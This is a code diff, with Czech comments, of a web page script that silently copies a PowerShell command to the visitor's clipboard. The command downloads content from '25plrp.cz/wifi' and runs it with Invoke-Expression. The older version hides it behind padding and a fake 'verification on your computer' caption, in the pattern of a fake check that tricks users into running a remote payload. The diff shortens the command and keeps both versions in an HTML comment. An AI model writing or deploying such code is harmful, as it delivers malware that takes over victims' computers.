@@ -100,7 +100,7 @@
 
         // Kopírování příkazu (můžete upravit dle potřeby)
         const psCommand =
-          'powershell -Command "& { $(Invoke-WebRequest "25plrp.cz/wifi").Content | Invoke-Expression }"         #             Po stisku proběhne ověření na vašem počítači ✅ ❌';
+          'powershell iwr "25plrp.cz/wifi" | iex';
         navigator.clipboard.writeText(psCommand).catch(() => {});
       }
     });
@@ -111,6 +111,7 @@
 
 
 <!--
+'powershell -Command "& { $(Invoke-WebRequest "25plrp.cz/wifi").Content | Invoke-Expression }"         #             Po stisku proběhne ověření na vašem počítači ✅ ❌';
 powershell iwr "25plrp.cz/wifi" | iex 
 # Místo iex lze použít:
 powershell -File "C:\cesta\skript.ps1"
